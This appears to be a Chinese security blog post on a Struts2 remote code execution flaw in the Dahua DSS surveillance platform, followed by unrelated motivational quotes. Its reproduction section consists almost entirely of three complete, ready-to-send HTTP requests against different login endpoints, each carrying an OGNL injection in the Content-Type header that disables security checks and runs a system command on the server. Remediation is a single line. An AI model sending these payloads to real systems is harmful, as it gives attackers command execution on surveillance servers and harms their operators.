#  大华DSS 安防新平台struts2远程代码执行   
原创 SXdysq  南街老友   2024-06-03 21:16  
  
**漏洞简介**  
  
大华DSS安防监控系统平台是一款集视频、报警、存储、管理于一体的综合安防解决方案。该平台支持多种接入方式，包括网络视频、模拟视频、数字视频、IP电话、对讲机等。此外，该平台还支持多种报警方式，包括移动侦测、区域入侵、越线报警、人员聚集等。  
  
大华DSS安防监控系统平台采用Apache Struts2作为网站应用框架。由于应用程序框架存在远程命令执行漏洞，攻击者可以通过在上传文件时修改HTTP请求标头中的Content Type值来触发该漏洞，然后执行该漏洞。系统命令以获取服务器权限。  
  
**漏洞复现**  
```
POST /portal/login_init.action HTTP/1.1
Host: 
Connection: close
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
Cache-Control: no-cache
Pragma: no-cache
User-Agent: Java/1.8.0_333
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 0

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtD72cgeb3Byl9YoaA2xOC3erAjVibWWV8S0JD2ibf0UiaNjul01snj2dBvbmwOchXwtg2UO0G1aRt6YQ/640?wx_fmt=png&from=appmsg "")  
```
POST /admin/login_login.action HTTP/1.1
Host: 
Connection: close
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
Cache-Control: no-cache
Pragma: no-cache
User-Agent: Java/1.8.0_333
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 0


```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dfviaLov8RtD72cgeb3Byl9YoaA2xOC3ebGWmn1mFNdoiacia8wypiaU3jxoGyoHu3nePPUQW0uG0tBUeyiceQTUUiaw/640?wx_fmt=jpeg&from=appmsg "")  
```
POST /config/user_toLoginPage.action HTTP/1.1
Host: 
Connection: close
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
Cache-Control: no-cache
Pragma: no-cache
User-Agent: Java/1.8.0_333
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 0


```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtD72cgeb3Byl9YoaA2xOC3exzVwdEyGsibXscv5ibVbACfaTEYmsCkAvcd8gyU53xg16mictGDcuibxrg/640?wx_fmt=png&from=appmsg "")  
  
**修复建议**  
  
更新软件，修补漏洞。  
**🍻**  
**🍻**  
**🍻**  
  
**🍻**  
**🍻**  
**🍻**  
1、不要慌不要慌 太阳下了有月光2、满怀希望就会所向披靡3、是我青春篇章里最勇敢又失败的一页4、苦难是花开的伏笔5、愿你纵踩淤泥，也要心向光明6、每个人的花期不同，不必焦虑有人比你提前7、天空黑暗到一定程度，星辰就会熠熠生辉8、回头看，轻舟已过万重山9、身处低谷时，怎么走都是向上10、熬过低谷，繁花自现11、喜欢就争取，得到就珍惜，错过就忘记12、今天比昨天好，这就是希望13、以欢喜心过生活，以温柔心除挂碍14、我们身处阴沟，但仍有人仰望星空15、千万不要放弃，最好的东西总是压轴出场  
  
